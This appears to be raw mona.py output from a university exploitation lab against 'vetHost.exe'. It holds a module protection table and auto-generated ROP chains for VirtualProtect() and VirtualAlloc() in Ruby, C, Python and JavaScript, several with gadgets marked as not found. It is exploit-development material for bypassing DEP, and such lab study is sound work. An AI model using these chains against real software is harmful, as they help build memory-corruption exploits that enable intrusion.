-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x11000000 | 0x11025000 | 0x00025000 | False  | False   | True  |  True    | False  | -1.0- [vetHost.exe] (Z:\VM-Share\School\CSC848\Lab05\vetHost.exe)
 0x6f000000 | 0x6f04c000 | 0x0004c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x7dd60000 | 0x7de70000 | 0x00110000 | False  | True    | True  |  True    | True   | 6.1.7601.18015 [kernel32.dll] (C:\Windows\syswow64\kernel32.dll)
 0x6ff50000 | 0x6fffc000 | 0x000ac000 | False  | True    | True  |  True    | True   | 7.0.7601.17744 [msvcrt.dll] (C:\Windows\syswow64\msvcrt.dll)
 0x10000000 | 0x1000c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7601.24545 [CRYPTBASE.dll] (C:\Windows\syswow64\CRYPTBASE.dll)
 0x7de70000 | 0x7dff0000 | 0x00180000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SysWOW64\ntdll.dll)
 0x02aa0000 | 0x02ab9000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SysWOW64\sechost.dll)
 0x7d910000 | 0x7d970000 | 0x00060000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x7d620000 | 0x7d62a000 | 0x0000a000 | False  | True    | True  |  True    | True   | 6.1.7601.24537 [LPK.dll] (C:\Windows\syswow64\LPK.dll)
 0x6f8e0000 | 0x6f97d000 | 0x0009d000 | False  | True    | True  |  True    | True   | 1.0626.7601.24535 [USP10.dll] (C:\Windows\syswow64\USP10.dll)
 0x7d8a0000 | 0x7d900000 | 0x00060000 | False  | True    | True  |  True    | True   | 6.1.7601.24545 [SspiCli.dll] (C:\Windows\syswow64\SspiCli.dll)
 0x72540000 | 0x7269f000 | 0x0015f000 | False  | True    | True  |  True    | True   | 6.1.7601.24537 [ole32.dll] (C:\Windows\syswow64\ole32.dll)
 0x6de20000 | 0x6de77000 | 0x00057000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [SHLWAPI.dll] (C:\Windows\syswow64\SHLWAPI.dll)
 0x7dc50000 | 0x7dd50000 | 0x00100000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\Windows\syswow64\USER32.dll)
 0x40bc0000 | 0x40bd2000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MPR.dll] (C:\Windows\system32\MPR.dll)
 0x6fc30000 | 0x6fcc2000 | 0x00092000 | False  | True    | True  |  True    | True   | 6.1.7601.24537 [OLEAUT32.dll] (C:\Windows\syswow64\OLEAUT32.dll)
 0x019f0000 | 0x019fb000 | 0x0000b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\syswow64\profapi.dll)
 0x73800000 | 0x7444c000 | 0x00c4c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\syswow64\SHELL32.dll)
 0x7db50000 | 0x7dc40000 | 0x000f0000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\syswow64\RPCRT4.dll)
 0x406a0000 | 0x406b9000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [USERENV.dll] (C:\Windows\syswow64\USERENV.dll)
 0x40160000 | 0x40166000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7601.23889 [NSI.dll] (C:\Windows\syswow64\NSI.dll)
 0x70990000 | 0x70a5e000 | 0x000ce000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\syswow64\MSCTF.dll)
 0x7d850000 | 0x7d897000 | 0x00047000 | False  | True    | True  |  True    | True   | 6.1.7601.18015 [KERNELBASE.dll] (C:\Windows\syswow64\KERNELBASE.dll)
 0x7dab0000 | 0x7db40000 | 0x00090000 | False  | True    | True  |  True    | True   | 6.1.7601.24540 [GDI32.dll] (C:\Windows\syswow64\GDI32.dll)
 0x71800000 | 0x7188d000 | 0x0008d000 | False  | True    | True  |  True    | True   | 6.1.7601.19050 [AcLayers.DLL] (C:\Windows\AppPatch\AcLayers.DLL)
 0x6d930000 | 0x6d981000 | 0x00051000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINSPOOL.DRV] (C:\Windows\system32\WINSPOOL.DRV)
 0x77c60000 | 0x77d01000 | 0x000a1000 | False  | True    | True  |  True    | True   | 6.1.7601.24545 [ADVAPI32.dll] (C:\Windows\syswow64\ADVAPI32.dll)
 0x41ac0000 | 0x41af5000 | 0x00035000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.dll] (C:\Windows\syswow64\WS2_32.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x110010a5,  # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x110010a5,  # skip 4 bytes [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x11007591,  # POP EBX # RETN [vetHost.exe] ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x11015353,  # POP EDX # RETN [vetHost.exe] ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x1100d2f3,  # POP ECX # RETN [vetHost.exe] ** ASLR 
      0x11021338,  # &Writable location [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x11016835,  # POP EDI # RETN [vetHost.exe] ** ASLR 
      0x11017086,  # RETN (ROP NOP) [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x1100c778,  # POP ESI # RETN [vetHost.exe] ** ASLR 
      0x1100274b,  # JMP [EAX] [vetHost.exe]
      0x1100b548,  # POP EAX # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x11018030,  # ptr to &VirtualProtect() [IAT vetHost.exe] ** ASLR
      0x41414141,  # Filler (compensate)
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
      #[---INFO:extras:---]
      0x00000000,  # <- Unable to find ptr to 'jmp esp'
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x110010a5,  // POP EBP // RETN [vetHost.exe] ** ASLR 
      0x110010a5,  // skip 4 bytes [vetHost.exe] ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x11007591,  // POP EBX // RETN [vetHost.exe] ** ASLR 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x11015353,  // POP EDX // RETN [vetHost.exe] ** ASLR 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x1100d2f3,  // POP ECX // RETN [vetHost.exe] ** ASLR 
      0x11021338,  // &Writable location [vetHost.exe] ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x11016835,  // POP EDI // RETN [vetHost.exe] ** ASLR 
      0x11017086,  // RETN (ROP NOP) [vetHost.exe] ** ASLR
      //[---INFO:gadgets_to_set_esi:---]
      0x1100c778,  // POP ESI // RETN [vetHost.exe] ** ASLR 
      0x1100274b,  // JMP [EAX] [vetHost.exe]
      0x1100b548,  // POP EAX // POP EBP // RETN [vetHost.exe] ** ASLR 
      0x11018030,  // ptr to &VirtualProtect() [IAT vetHost.exe] ** ASLR
      0x41414141,  // Filler (compensate)
      //[---INFO:pushad:---]
      0x00000000,  // [-] Unable to find pushad gadget
      //[---INFO:extras:---]
      0x00000000,  // <- Unable to find ptr to 'jmp esp'
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x110010a5,  # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x110010a5,  # skip 4 bytes [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x11007591,  # POP EBX # RETN [vetHost.exe] ** ASLR 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x11015353,  # POP EDX # RETN [vetHost.exe] ** ASLR 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x1100d2f3,  # POP ECX # RETN [vetHost.exe] ** ASLR 
      0x11021338,  # &Writable location [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x11016835,  # POP EDI # RETN [vetHost.exe] ** ASLR 
      0x11017086,  # RETN (ROP NOP) [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x1100c778,  # POP ESI # RETN [vetHost.exe] ** ASLR 
      0x1100274b,  # JMP [EAX] [vetHost.exe]
      0x1100b548,  # POP EAX # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x11018030,  # ptr to &VirtualProtect() [IAT vetHost.exe] ** ASLR
      0x41414141,  # Filler (compensate)
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
      #[---INFO:extras:---]
      0x00000000,  # <- Unable to find ptr to 'jmp esp'
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u10a5%u1100" + // 0x110010a5 : ,# POP EBP # RETN [vetHost.exe] ** ASLR 
    "%u10a5%u1100" + // 0x110010a5 : ,# skip 4 bytes [vetHost.exe] ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u7591%u1100" + // 0x11007591 : ,# POP EBX # RETN [vetHost.exe] ** ASLR 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u5353%u1101" + // 0x11015353 : ,# POP EDX # RETN [vetHost.exe] ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%ud2f3%u1100" + // 0x1100d2f3 : ,# POP ECX # RETN [vetHost.exe] ** ASLR 
    "%u1338%u1102" + // 0x11021338 : ,# &Writable location [vetHost.exe] ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u6835%u1101" + // 0x11016835 : ,# POP EDI # RETN [vetHost.exe] ** ASLR 
    "%u7086%u1101" + // 0x11017086 : ,# RETN (ROP NOP) [vetHost.exe] ** ASLR
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%uc778%u1100" + // 0x1100c778 : ,# POP ESI # RETN [vetHost.exe] ** ASLR 
    "%u274b%u1100" + // 0x1100274b : ,# JMP [EAX] [vetHost.exe]
    "%ub548%u1100" + // 0x1100b548 : ,# POP EAX # POP EBP # RETN [vetHost.exe] ** ASLR 
    "%u8030%u1101" + // 0x11018030 : ,# ptr to &VirtualProtect() [IAT vetHost.exe] ** ASLR
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:pushad:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
    "" + // #[---INFO:extras:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# <- Unable to find ptr to 'jmp esp'
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x11015a7f,  # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x11015a7f,  # skip 4 bytes [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x1100a870,  # POP EBX # RETN [vetHost.exe] ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x110153b8,  # POP EDX # RETN [vetHost.exe] ** ASLR 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x1100d2f3,  # POP ECX # RETN [vetHost.exe] ** ASLR 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x11017085,  # POP EDI # RETN [vetHost.exe] ** ASLR 
      0x11017086,  # RETN (ROP NOP) [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x110070ab,  # POP ESI # RETN [vetHost.exe] ** ASLR 
      0x1100274b,  # JMP [EAX] [vetHost.exe]
      0x11015a7e,  # POP EAX # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x00000000,  # [-] Unable to find ptr to &VirtualAlloc()
      0x41414141,  # Filler (compensate)
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
      #[---INFO:extras:---]
      0x00000000,  # <- Unable to find ptr to 'jmp esp'
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x11015a7f,  // POP EBP // RETN [vetHost.exe] ** ASLR 
      0x11015a7f,  // skip 4 bytes [vetHost.exe] ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x1100a870,  // POP EBX // RETN [vetHost.exe] ** ASLR 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x110153b8,  // POP EDX // RETN [vetHost.exe] ** ASLR 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x1100d2f3,  // POP ECX // RETN [vetHost.exe] ** ASLR 
      0x00000040,  // 0x00000040-> ecx
      //[---INFO:gadgets_to_set_edi:---]
      0x11017085,  // POP EDI // RETN [vetHost.exe] ** ASLR 
      0x11017086,  // RETN (ROP NOP) [vetHost.exe] ** ASLR
      //[---INFO:gadgets_to_set_esi:---]
      0x110070ab,  // POP ESI // RETN [vetHost.exe] ** ASLR 
      0x1100274b,  // JMP [EAX] [vetHost.exe]
      0x11015a7e,  // POP EAX // POP EBP // RETN [vetHost.exe] ** ASLR 
      0x00000000,  // [-] Unable to find ptr to &VirtualAlloc()
      0x41414141,  // Filler (compensate)
      //[---INFO:pushad:---]
      0x00000000,  // [-] Unable to find pushad gadget
      //[---INFO:extras:---]
      0x00000000,  // <- Unable to find ptr to 'jmp esp'
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x11015a7f,  # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x11015a7f,  # skip 4 bytes [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x1100a870,  # POP EBX # RETN [vetHost.exe] ** ASLR 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x110153b8,  # POP EDX # RETN [vetHost.exe] ** ASLR 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x1100d2f3,  # POP ECX # RETN [vetHost.exe] ** ASLR 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x11017085,  # POP EDI # RETN [vetHost.exe] ** ASLR 
      0x11017086,  # RETN (ROP NOP) [vetHost.exe] ** ASLR
      #[---INFO:gadgets_to_set_esi:---]
      0x110070ab,  # POP ESI # RETN [vetHost.exe] ** ASLR 
      0x1100274b,  # JMP [EAX] [vetHost.exe]
      0x11015a7e,  # POP EAX # POP EBP # RETN [vetHost.exe] ** ASLR 
      0x00000000,  # [-] Unable to find ptr to &VirtualAlloc()
      0x41414141,  # Filler (compensate)
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
      #[---INFO:extras:---]
      0x00000000,  # <- Unable to find ptr to 'jmp esp'
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u5a7f%u1101" + // 0x11015a7f : ,# POP EBP # RETN [vetHost.exe] ** ASLR 
    "%u5a7f%u1101" + // 0x11015a7f : ,# skip 4 bytes [vetHost.exe] ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%ua870%u1100" + // 0x1100a870 : ,# POP EBX # RETN [vetHost.exe] ** ASLR 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u53b8%u1101" + // 0x110153b8 : ,# POP EDX # RETN [vetHost.exe] ** ASLR 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%ud2f3%u1100" + // 0x1100d2f3 : ,# POP ECX # RETN [vetHost.exe] ** ASLR 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u7085%u1101" + // 0x11017085 : ,# POP EDI # RETN [vetHost.exe] ** ASLR 
    "%u7086%u1101" + // 0x11017086 : ,# RETN (ROP NOP) [vetHost.exe] ** ASLR
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u70ab%u1100" + // 0x110070ab : ,# POP ESI # RETN [vetHost.exe] ** ASLR 
    "%u274b%u1100" + // 0x1100274b : ,# JMP [EAX] [vetHost.exe]
    "%u5a7e%u1101" + // 0x11015a7e : ,# POP EAX # POP EBP # RETN [vetHost.exe] ** ASLR 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to &VirtualAlloc()
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:pushad:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
    "" + // #[---INFO:extras:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# <- Unable to find ptr to 'jmp esp'
    ""); //  : 


--------------------------------------------------------------------------------------------------

